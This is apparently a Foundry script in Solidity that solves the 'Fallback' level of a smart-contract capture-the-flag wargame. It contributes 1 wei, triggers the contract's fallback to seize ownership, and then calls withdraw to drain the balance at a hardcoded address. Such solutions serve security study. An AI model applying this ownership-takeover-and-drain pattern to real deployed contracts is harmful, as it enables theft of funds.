// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/levels/01-Fallback/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level01Solution is Script{
    Fallback level01 = Fallback(payable(0x4756A164cE3135913b2D62D9128aE42917D35a0a));

    function run() external{
        vm.startBroadcast();

        // contribute money
        level01.contribute{value: 1 wei}();
        // check contibution
        console.log("My contribution, ", level01.getContribution());
        // change owner
        (bool success,) = address(level01).call{value: 1 wei}("");

        if(success){

            // check new owner
            console.log("New Owner  , ", level01.owner());

            // withdraw
            level01.withdraw();
        }

        vm.stopBroadcast();
    }
} 